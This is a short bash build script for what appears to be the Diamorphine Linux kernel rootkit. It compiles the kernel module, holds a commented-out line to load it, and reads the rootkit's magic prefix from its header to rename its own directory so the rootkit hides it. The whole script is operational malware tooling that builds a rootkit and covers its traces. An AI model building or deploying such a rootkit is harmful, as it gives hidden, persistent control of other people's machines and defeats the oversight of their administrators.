#!/bin/bash

make

koFile=diamorphine.ko
hFile=diamorphine.h
if test -f "$koFile"; then #testing if .ko was built properly
    #sudo insmod "$koFile"
    magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
    thisDirPath=$(pwd)
    thisDir=${PWD##*/}
    mv "$thisDirPath" '../'"$magicPrefix""$thisDir"

    echo "built."
fi